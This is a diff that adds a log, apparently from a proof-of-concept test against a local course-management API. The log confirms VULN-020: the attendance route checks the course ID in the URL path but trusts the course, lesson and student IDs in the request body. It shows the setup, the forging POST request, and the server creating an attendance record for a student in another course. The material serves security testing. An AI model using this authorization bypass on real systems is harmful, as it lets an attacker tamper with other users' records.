@@ -1,0 +1,17 @@
+========================================================================
+VULN-020: Attendance forgery via body courseId/lessonId/studentId
+target: API=http://localhost:21527  dashboard=http://localhost:21526
+========================================================================
+[INFO] route attendance.ts:9-24 authorizes path :courseId but writes the body verbatim
+[SETUP] admin login
+[SETUP] provisioning the attacker as a STUDENT of course A
+[SETUP] attacker user=4ab6baa7-fbe5-45c7-9801-bda308191000 is a STUDENT of course A=e03d8e42-24b7-47fe-b4b3-63b49649a9d1
+[SETUP] provisioning a separate course B with a victim STUDENT
+[SETUP] victim course B=45a482df-6b3d-4e68-b85b-a383c3627abf victim groupmember id=ae0cc735-421c-4cb3-9250-351adc53d452 (profile=a5b9e79b-72cf-44cb-9024-07c500557b17)
+[INFO]   rows for (course B, victim, lesson) before attack = 0
+[STEP] attacker POST /course/e03d8e42-24b7-47fe-b4b3-63b49649a9d1/attendance  body targets course B + victim: {'courseId': '45a482df-6b3d-4e68-b85b-a383c3627abf', 'lessonId': 'ef58e841-7169-49f7-bd67-4a9ea5a6dce1', 'studentId': 'ae0cc735-421c-4cb3-9250-351adc53d452', 'isPresent': False}
+[INFO]   response: HTTP 201 {"success":true,"data":{"id":4,"createdAt":"2026-09-27 14:49:49.685227+00","updatedAt":"2026-09-27 14:49:49.685227+00","courseId":"45a482df-6b3d-4e68-b85b-a383c3627abf","studentId":"ae0cc735-421c-4cb3
+[INFO]   group_attendance row for (course B, victim, lesson) after attack = '4|f'
+[PROOF] a member of course A wrote a group_attendance row for course B + victim groupmember ae0cc735-421c-4cb3-9250-351adc53d452 (row='4|f') — attendance forged in a course the attacker has no role in
+==> VULN-020: CONFIRMED — cross-course attendance forgery via trusted body params
+[OK] exploit confirmed — forged victim attendance in an unrelated course
